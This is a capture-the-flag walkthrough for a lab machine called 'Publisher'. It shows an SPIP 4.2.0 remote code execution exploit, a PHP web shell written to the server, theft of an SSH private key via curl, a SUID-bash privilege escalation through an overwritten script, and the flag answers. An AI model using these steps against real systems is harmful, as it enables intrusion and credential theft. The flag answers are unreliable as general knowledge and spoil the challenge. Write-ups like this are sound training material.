## Room Description
The "**Publisher**" CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system's security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.
## Solution
![[screenshots/ss_1.png]]
#### nmap
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)  
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)  
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)  
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
|_http-title: Publisher's Pulse: SPIP Insights & Tips
```

#### dirsearch
```
/images/
/spip/
```

#### Exploiting
Site has been published with **SPIP 4.2.0**
On *exploit-db* i found this [exploit](https://www.exploit-db.com/exploits/51536)

So, i'd recommend to set up a virtual environment for running exploit
```bash
mv 51536.py spip_rce.py # rename executable file
python3 -m venv publisher_venv # create a venv
source publisher_venv/bin/activate # activate venv
pip3 install bs4 # install libraries
pip3 install requests==2.28.2 # install libraries
python3 spip_rce.py -u http://10.10.163.246 -c whoami -v # test exploiting
```

Also we need to create a file with *RCE* (for comfortable exploiting)
```bash
echo "<?php system($_GET["cmd"]); ?>" | base64
PD9waHAgc3lzdGVtKCk7ID8+Cg==
```

```bash
python3 spip_rce.py -u http://10.10.163.246/spip -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+C  
g== | base64 -d > rce.php' -v
```

Now we can execute code with curl:
```bash
curl "http://10.10.163.246/spip/rce.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Find our `user.txt` flag:
```bash
curl "http://10.10.163.246/spip/rce.php?cmd=ls%20-la%20%2Fhome"
curl "http://10.10.163.246/spip/rce.php?cmd=cat%20%2Fhome%2Fthink%2Fuser.txt"
```
`fa229046d44eda6a3598c73ad96f4ca5`
#### Stabilize shell (ssh)
Target machine has a private ssh, so we can connect via ssh with it
```bash
curl "http://10.10.163.246/spip/rce.php?cmd=cat%20%2Fhome%2Fthink%2F.ssh%2Fid_rsa" > id_rsa
chmod 400 id_rsa
ssh -i id_rsa think@10.10.163.246
```
#### root.txt Flag
Use command `find / -perm -4000 2>/dev/null` to see what command we are able to run with user's permissions
```
/tmp/default  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/lib/openssh/ssh-keysign  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/lib/xorg/Xorg.wrap  
/usr/sbin/pppd  
/usr/sbin/run_container  
/usr/bin/at  
/usr/bin/fusermount  
/usr/bin/gpasswd  
/usr/bin/chfn  
/usr/bin/sudo  
/usr/bin/chsh  
/usr/bin/passwd  
/usr/bin/mount  
/usr/bin/su  
/usr/bin/newgrp  
/usr/bin/pkexec  
/usr/bin/umount
```

`/usr/sbin/run_container` is what we are interested in

```bash
think@publisher:~$ /usr/sbin/run_container  
List of Docker containers:  
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 2 hours  
  
Enter the ID of the container or leave blank to create a new one:    
/opt/run_container.sh: line 16: validate_container_id: command not found  
  
OPTIONS:  
1) Start Container  
2) Stop Container  
3) Restart Container  
4) Create Container  
5) Quit  
Choose an action for a container: 5  
Exiting...
```

We see, it runs `/opt/run_container.sh`. So we need to change this file
```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/default\nchmod +s /tmp/default' > /opt/run_container.sh
cd /opt
run_container
ls -la /tmp # default is the copy of /bin/bash with root priv
cd /tmp
./default -p
cat /root/root.txt
```
## Questions
***Question #1.*** What is the user flag?
*Answer*: **fa229046d44eda6a3598c73ad96f4ca5**
**Question #2.** What is the root flag?
*Answer:* **3a4225cc9e85709adda6ef55d6a4f2ca**

---
### Resources
- **Worldist** (*dirsearch*) - https://github.com/danielmiessler/SecLists
- **Exploit** (*SPIP v4.2.0 - RCE*) - https://www.exploit-db.com/exploits/51536
